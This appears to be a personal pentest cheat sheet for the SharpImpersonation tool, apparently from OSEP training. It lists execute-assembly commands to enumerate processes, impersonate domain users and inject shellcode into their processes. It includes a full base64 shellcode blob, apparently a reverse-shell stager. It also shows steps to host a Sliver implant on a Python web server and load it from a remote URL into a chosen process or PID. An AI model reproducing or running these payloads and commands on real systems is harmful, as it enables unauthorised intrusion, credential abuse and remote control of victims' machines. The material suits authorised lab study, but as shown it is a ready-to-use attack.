# SharpImpersonation

This will find processes as the specified user and run shellcode within the first found process

When lots of processes as different users are running, wmi is fastest to enumerate

### 1) List processes to impersonate // elevated

    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe list
    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe list wmi
    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe list elevated


### 2) Execute command as user

    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user binary:"powershell ls"

### 3) Load base64 encoded shellcode

    base64 -w0 /home/kali/OSEP/hav0c/sliver.x64.bin
    execute-assembly -i /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user shellcode:/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFbwKgtvkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==

### 4) Host shellcode on the web server

    sudo python3 -m http.server 80
    sudo chmod 777 /home/kali/OSEP/hav0c/sliver.x64.bin

### 5) Load shellcode from the URL - works the best

    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user shellcode:http://10.10.10.11/sliver.x64.bin
    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe user:domain\\user shellcode:http://10.10.10.11/sliver.x86.bin

### 6) On custom PID 

    execute-assembly /home/kali/tools/bins/csharp-files/SharpImpersonation.exe pid:644 shellcode:http://10.10.10.11/sliver.x86.bin
